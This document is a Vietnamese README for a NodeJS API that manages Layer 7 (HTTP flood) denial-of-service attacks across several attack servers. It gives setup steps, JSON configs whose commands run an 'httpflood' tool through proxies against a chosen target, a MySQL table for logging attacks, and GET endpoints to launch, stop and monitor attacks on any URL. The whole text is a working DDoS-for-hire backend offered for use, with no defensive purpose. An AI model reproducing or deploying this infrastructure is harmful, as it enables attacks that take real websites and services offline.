<h2>Trình quản lý API NodeJS cho các cuộc tấn công Lớp 7</h2>

<h4>API này rất an toàn và nhanh chóng (mất 2 lần ping giữa API và phần phụ trợ, tức là ping là 60ms, sẽ chỉ mất 120ms để khởi động cuộc tấn công)</h4>

<h1>Cài đặt:</h1>

```sh
curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt -y install nodejs
npm i express mysql
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "1": {
        "name": "1",
        "ip": "1.1.1.1",
        "port": 3000
    },
    "2": {
        "name": "2",
        "ip": "2.2.2.2",
        "port": 3000
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt"
}
```

<h3>Update settings.json</h3><br>

```json
{
    "database": {
        "host": "localhost",
        "user": "DATABASE_USER",
        "password": "DATABASE_PASSWORD",
        "database": "DATABASE_NAME"
    },
    "socket_token": "SECRET_TOKEN", 
    "max_attacksn": 15,
    "api_port": 3000
}
```

<h3>Update client.js:</h3><br>

```js
const socket_port = 3000; // cổng API
const socket_token = "SECRET_TOKEN"; // mã thông báo bí mật của bạn để bảo vệ kết nối TCP
const allowed_ips = ['1.1.1.1']; // IP máy chủ API
```

<h3>Thiết lập cơ sở dữ liệu</h3><br>

```sql
CREATE DATABASE manager;

use manager;

CREATE TABLE `attacks` (
    `id` int(11) NOT NULL,
    `server` varchar(300) DEFAULT NULL,
    `target` text DEFAULT NULL,
    `duration` int(11) NOT NULL,
    `method` varchar(255) DEFAULT NULL,
    `date_sent` int(11) DEFAULT NULL,
    `stopped` int(11) NOT NULL DEFAULT 0,
    `attack_id` int(11) DEFAULT NULL
);

ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);

ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
```

## Sau đó, tải client.js lên máy chủ tấn công và tải api.js, server.json, command.json và settings.json lên máy chủ API

### Proxy ngược

Nên tạo proxy ngược bằng Nginx để sử dụng API của bạn:

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api {
        proxy_pass http://backend:3000/api;
    }
}
```

Thay thế `'http://backend:3000/api'` bằng URL máy chủ API của bạn

### Sử dụng API

Gửi yêu cầu GET tới API bằng các trường bắt buộc

GET `https://api.yourdomain.com/api/attack?target=https://website.com&duration=120&method=HTTPGET&server=1`

Bạn có thể ngăn chặn các cuộc tấn công bằng cách gửi yêu cầu GET tới API bằng ID tấn công

GET `https://api.yourdomain.com/api/stop?attack_id=[id]`

Bạn cũng có thể xem tất cả các cuộc tấn công đang diễn ra và việc sử dụng máy chủ bằng cách gửi yêu cầu GET tới API

GET `https://api.yourdomain.com/api/status`

Bạn cũng có thể dừng tất cả các cuộc tấn công gửi yêu cầu GET tới API

GET `https://api.yourdomain.com/api/stop_all`
